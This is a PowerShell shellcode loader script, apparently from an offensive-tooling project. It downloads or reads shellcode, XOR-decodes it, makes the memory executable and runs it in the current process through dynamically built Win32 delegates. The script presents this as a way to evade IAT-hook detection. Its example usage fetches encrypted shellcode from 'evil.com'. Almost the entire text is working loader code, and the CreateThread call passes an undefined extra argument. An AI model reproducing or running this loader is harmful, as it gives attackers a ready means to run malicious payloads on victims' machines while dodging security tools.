function Local-ProcessInject {
#.SYNOPSIS
# Standalone PowerShell script for local process injection, supporting threadless execution.
# Arbitrary Version Number: v1.0.0
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
# wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
# Works with both Windows PowerShell and PowerShell Core (Pwsh). Using 64-bit PowerShell sessions
# allows for both 64-bit and 32-bit injection, whereas 32-bit sessions only allow 32-bit injection.
#
# (Note: might be broken as of new Windows memory protections -- try Remote-ProcessInject instead)
#
# Windows API Call(s) Utilized:
#  |__ VirtualProtect()
#  |__ CreateThread() | CallWindowProcW()
#
# Parameters:
#   -Shellcode   -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
#   -XorKey      -->  XOR cipher key for the shellcode (max value: 0xFF).
#   -Threadless  -->  Execute shellcode without creating a new thread (current process will die).
#   -UseProxy    -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
#   -Debug       -->  Pause execution and shellcode memory address for process attachment.
#   -Help        -->  Return Get-Help information.
#
# Example Usage:
#  ____________________________________________________________________________________________
# |                                                                                            |
# | # Inject current PowerShell process and pause execution to attach with a debugger          |
# | PS> Local-ProcessInject -Shellcode ./calc64.bin -Debug                                     |
# |                                                                                            |
# | # Inject current PowerShell process without creating a new thread (will kill the process)  |
# | PS> Local-ProcessInject -Shellcode ./msgbox64.bin -Threadless                              |
# |                                                                                            |
# | # Inject current PowerShell process with XOR encrypted shellcode downloaded from a URI     |
# | PS> Local-ProcessInject -Shellcode 'https://evil.com/bin' -XorKey 0x69                     |
# |____________________________________________________________________________________________|
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS


    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [UInt32]$XorKey,
        [Switch]$Threadless,
        [switch]$UseProxy,
        [Switch]$Debug,
        [Switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Local-ProcessInject) }


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {

        # Function Description   : PowerShell Script (mini version) to Convert Multi-Language Shellcode Strings into Byte Arrays
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Format-ByteArray.ps1

        Write-Host '[!] Formatting Shellcode for PowerShell...' -ForegroundColor Yellow

        if ($Shellcode -is [array]) {
            if ($Shellcode -is [Byte[]]) {
                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            else {
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }

        if ($Shellcode -is [uri]) {
            Write-Host ' o  Shellcode parameter is a [uri].'
            Write-Host " o  --> URI : $($Shellcode.AbsoluteUri)"
            Write-Host ' o  --> Downloading data...'
            Try {
                if ($UseProxy) {
                    $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode.AbsoulteUri)
                    $WebClient = [System.Net.WebClient]::new()
                    $Proxy     = [System.Net.WebProxy]::new()
                    $Proxy.Address = $LinkProxy.AbsoluteUri
                    $Proxy.UseDefaultCredentials = $TRUE
                    $WebClient.Proxy = $Proxy
                    $ShellcodeBuffer = $WebClient.DownloadData($Shellcode.AbsoluteUri)
                }
                else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode.AbsoluteUri) }
            }
            Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
        }

        if ($Shellcode -is [String]) {
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                Write-Host ' o  Shellcode [string] is a path to a file.'
                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }
            elseif ($Shellcode -match "^(http://|https://)") {
                Write-Host ' o  Shellcode [string] is a URI.'
                Write-Host " o  --> URI : $Shellcode"
                Write-Host ' o  --> Downloading data...'
                Try {
                    if ($UseProxy) {
                        $LinkProxy = ([System.Net.WebRequest]::GetSystemWebProxy()).GetProxy($Shellcode)
                        $WebClient = [System.Net.WebClient]::new()
                        $Proxy     = [System.Net.WebProxy]::new()
                        $Proxy.Address = $LinkProxy.AbsoluteUri
                        $Proxy.UseDefaultCredentials = $TRUE
                        $WebClient.Proxy = $Proxy
                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                    }
                    else { $ShellcodeBuffer = [System.Net.WebClient]::new().DownloadData($Shellcode) }
                } 
                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
            }
            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }
            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }
            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }

        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        
        if ($XorKey) {
            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
            }
        }

        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 Functions into Session via Function Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch { return Generic-Error }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        Try {
            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
            return $TypeBuilder.CreateType()
        }
        Catch { return Generic-Error }
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }


    ### Define Required Constant(s) ###

    # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $MemoryProtection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_EXECUTE_READ      = 0x20;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }


    ### Load Required Win32 API Call(s) ###

    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow

    # Local Process Injection
    #  |__ VirtualProtect()
    #  |__ CreateThread() | CallWindowProcW()

    Try {
        $VirtProtectArgs = @(
            [IntPtr],                 #lpAddress
            [UInt32],                 # dwSize
            [UInt32],                 # flNewProtect
            [UInt32].MakeByRefType()  # lpflOldProtect
        )
        $VirtualProtect = Load-Win32Function -Library "Kernel32.dll" -FunctionName "VirtualProtect" -ParamTypes $VirtProtectArgs -ReturnType ([Bool])

        # Threadless shellcode execution
        if ($Threadless) {
            $CallWindowProcArgs = @(
                [IntPtr], # lpPrevWndFunc
                [IntPtr], # hWnd
                [UInt32], # Msg
                [Int32],  # wParam
                [UInt32]  # lParam
            )
            $CallWindowProcW = Load-Win32Function -Library "User32.dll" -FunctionName "CallWindowProcW" -ParamTypes $CallWindowProcArgs -ReturnType ([IntPtr])
        }
        # Default shellcode execution
        else {
            $CreateThreadArgs = @(
                [IntPtr],                # lpThreadAttributes
                [UInt32],                # dwStackSize
                [IntPtr],                # lpStartAddress
                [IntPtr],                # lpParameter
                [UInt32],                # dwCreationFlags
                [UInt32].MakeByRefType() # lpThreadId
            )
            $CreateThread = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateThread" -ParamTypes $CreateThreadArgs -ReturnType ([IntPtr])
        }
    }
    Catch { return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red) }


    ### Initialize Key Variables ###

    # Parameter Processing
    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
    if ($ShellcodeBuffer -isnot [byte[]]) { return }


    ### (1) Allocate Memory Buffer & Copy Shellcode ###

    Write-Host '[!] Writing shellcode to local process buffer...' -ForegroundColor Yellow
    Try {
        $ExecPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ShellcodeBuffer.Length)
        [System.RunTime.InteropServices.Marshal]::Copy($ShellcodeBuffer, 0, $ExecPtr, $ShellcodeBuffer.Length)
    }
    Catch { return Generic-Error }

    Write-Host ' o  ' -NoNewLine ; Write-Host '[System.RuntimeInteropServices.Marshal]' -ForegroundColor Green
    Write-Host " o  --> Shellcode copied to address : $(Print-Hex $ExecPtr)"
    Start-Sleep -Seconds 3


    ### (2) Set Buffer Protection to PAGE_EXECUTE_READ (0x20) ###

    Write-Host '[!] Changing memory buffer protection...' -ForegroundColor Yellow

    # VirtualProtect()
    #  > Definition  :  Changes the protection of a region within local process memory.
    #  > Location    :  Kernel32.dll
    #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

    # Argument(s)
    $lpAddress      = $ExecPtr                              # Pointer to the starting address in memory to change.
    $dwSize         = $ShellcodeBuffer.Length               # Size of the target memory buffer in bytes
    $flNewProtect   = $MemoryProtection.PAGE_EXECUTE_READ   # Memory protection flags for the specified region.
    $lpflOldProtect = 0                                     # Output variable to receive old memory protection flags.
    
    Write-Host ' o  ' -NoNewline; Write-Host 'VirtualProtect()' -ForegroundColor Green

    Try   { $Success = $VirtualProtect.Invoke($lpAddress, $dwSize, $flNewProtect, [ref]$lpflOldProtect) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    Write-Host ' o  --> Memory protection : 0x20 (PAGE_EXECUTE_READ)'
    Start-Sleep -Seconds 3


    # Optional: Debug Mode to Attach to Process

    if ($Debug) {
        
        $TargetProcess = Get-Process -Id $PID

        Write-Host "[x] Debug: " -NoNewline -ForegroundColor Magenta
        Write-Host 'Attach to the ' -NoNewline ; Write-Host "'$($TargetProcess.ProcessName)' ($($TargetProcess.Id))" -ForegroundColor Green -NoNewline ; Write-Host ' instance.'
        Write-Host ' o  --> Shellcode located at address : ' -NoNewline ; Write-Host $(Print-Hex $ExecPtr) -ForegroundColor Green
        Write-Host ' o  --> ' -NoNewline ; Write-Host 'PRESS ENTER TO EXECUTE SHELLCODE.' -ForegroundColor Red -NoNewline
        $NULL = Read-Host
    }
       

    # Step 3: Execution of Shellcode Buffer


    if ($Threadless) {

        Write-Host '[!] Executing shellcode (the current process will die)...' -ForegroundColor Yellow

        # CallWindowProcW()
        #  > Definition  :  Passes message information to the specified window procedure.
        #  > Location    :  User32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callwindowprocw
        #  > Reference   :  https://isc.sans.edu/diary/32238

        # Argument(s)
        $lpPrevWndFunc = $ExecPtr         # Pointer to previous window procedure (i.e., executable shellcode memory address)
        $hWnd          = [IntPtr]::Zero   # Handle to the window procedure to receive the message
        $Msg           = 0                # Message to process
        $wParam        = 0                # Additional information about the message 
        $lParam        = 0                # Additional information about the message

        
        Write-Host ' o  ' -NoNewline ; Write-Host 'CallWindowProcW()' -ForegroundColor Green

        Try   { $Result = $CallWindowProcW.Invoke($lpPrevWndFunc, $hWnd, $Msg, $wParam, $lParam) }
        Catch { return Generic-Error }

        Write-Host " o  --> Return Value : ${result}" # Process will likely die before getting here, but shellcode should have executed.
    }
    
    else {
        
        Write-Host '[!] Executing shellcode...' -ForegroundColor Yellow

        # CreateThread()
        #  > Definition  :  Create a thread to execute within the address space of the current process.
        #  > Location    :  Kernel32.dll
        #  > Reference   :  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

        # Argument(s)
        $lpThreadAtributes = [IntPtr]::Zero        # Pointer to SECURITY_ATTRIBUTES struct                     (i.e., optional and null by default)
        $dwStackSize       = 0                     # Initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
        $lpStartAddress    = $ExecPtr              # Pointer to the memory address to be executed              (i.e., executable shellcode memory address)
        $param             = [IntPtr]::Zero        # Pointer to a variable to be passed to the thread          (i.e., null pointer means none)
        $dwCreationFlags   = 0                     # Creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
        $lpThreadId        = 0                     # Pointer to a variable that receives the thread identifier (i.e., 0 for a throwaway variable)

        
        Write-Host ' o  ' -NoNewline ; Write-Host 'CreateThread()' -ForegroundColor Green

        Try   { $thread = $CreateThread.Invoke($hProcess, $lpThreadAtributes, $dwStacksize, $lpStartAddress, $param, $dwCreationFlags, [ref]$lpThreadId) }
        Catch { return Generic-Error }

        if ($Thread -eq 0) { return Win32-Error }
        Write-Host " o  --> Returned Thread : $(Print-Hex $thread)" -NoNewline
    }
}